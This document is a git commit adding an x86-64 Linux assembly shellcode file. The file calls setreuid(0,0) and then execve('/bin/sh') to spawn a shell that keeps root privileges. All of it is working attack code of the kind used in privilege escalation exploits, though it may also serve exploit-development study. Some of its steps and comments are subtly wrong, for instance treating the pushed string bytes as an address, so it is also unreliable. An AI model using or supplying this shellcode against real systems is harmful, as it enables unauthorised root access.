af537186ce28bf676fbdee30fb8c5ef659b51846
Mahmoud Jadaan <masjadaan@gmail.com>
2023-11-11 21:02:10 +0100

    Create syscall_shell.s

---
+++ Linux/shellcodes/syscall_shell/syscall_shell.s
@@ -0,0 +1,27 @@
+; Env: Ubuntu 64-bit architecture
+section .data
+    msg db '/bin/sh',0
+
+section .text
+	global main
+
+main:
+; Step 1: Set Effective User ID to zero
+; int setreuid(uid_t ruid, uid_t euid)
+	mov rax, 0 				; clearing rax
+	mov rdi, 0 				; passing argument 0 in rdi to setreuid()
+	mov rsi, 0 				; passing argument 0 in rsi to setreuid()
+	mov rax, 113 		 ; 113 = 0x71 is the syscall for setreuid() in the current environment
+	syscall 					; trigger an interrupt to execute setreuid()
+
+; Step 2: Spawn a shell
+; int execve(const char *pathname, char *const _Nullable argv[], char *const _Nullable envp[]);
+	mov rax, 0					 ; clearing rax
+	push qword [msg]	  ; placing the address /bin/sh onto the stack.
+	mov rdi, rsp 			 ; rsp points to the address of /bin/sh on stack, thus we store it in rdi
+	push rax						; rax was set to 0, this serves as a null terminator.
+	push rdi					  ; rdi is the first argument to execve, it contains the address of /bin/sh.
+	mov rsi, rsp			 ; rsi is the second argument to execve, it contains the string /bin/sh.
+	mov rdx, 0					; setting Null in the third argument to execve()
+	mov rax, 59				  ; store system call number (59 = 0x3B) for execve() in rax
+	syscall						  ; trigger an interrupt to execute execve()
